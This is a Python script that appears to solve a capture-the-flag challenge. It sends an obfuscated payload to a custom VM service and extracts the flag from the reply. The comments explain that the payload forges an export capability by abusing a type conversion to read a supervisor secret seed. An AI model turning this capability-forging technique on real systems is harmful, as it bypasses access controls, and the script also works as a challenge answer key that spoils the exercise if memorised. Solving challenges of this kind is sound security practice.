#!/usr/bin/env python3
import re
import socket
import sys

# Decoded VM program:
#   magic
#   r1 = r7 ^ ((1+1) * r0)       ; r7 is supervisor secret seed, r0 is 0 -> r1 = seed, type -> scalar
#   r2 = fmix(r7 ^ CONST)         ; derives export capability from seed
#   r3 = r2 ^ ((1+1) * r0)       ; type conversion -> scalar
#   capability_export(r1, r3)     ; opens secret/flag
#   halt
# The bytes below are the obfuscated wire encoding expected by RUN.
PAYLOAD_HEX = "4285cfe9c40257076ac2e0b0dafabec8ad3e5f973bcb81d3"


def recv_some(sock: socket.socket, timeout: float = 2.0) -> bytes:
    sock.settimeout(timeout)
    out = b""
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        out += chunk
        if b"\n" in chunk:
            break
    return out


def main() -> int:
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} HOST PORT", file=sys.stderr)
        return 2

    host = sys.argv[1]
    port = int(sys.argv[2])

    with socket.create_connection((host, port), timeout=8) as s:
        banner = recv_some(s, 3)
        if banner:
            print(banner.decode(errors="replace").rstrip())

        s.sendall(b"RUN " + PAYLOAD_HEX.encode() + b"\n")

        data = b""
        s.settimeout(5)
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
            if b"OK " in data or b"ERR " in data:
                break

        text = data.decode(errors="replace")
        print(text.rstrip())

        m = re.search(r"([A-Z0-9_]+\{[^\r\n}]+\})", text)
        if m:
            print(f"<FLAG>{m.group(1)}</FLAG>")
            return 0

        return 1


if __name__ == "__main__":
    raise SystemExit(main())
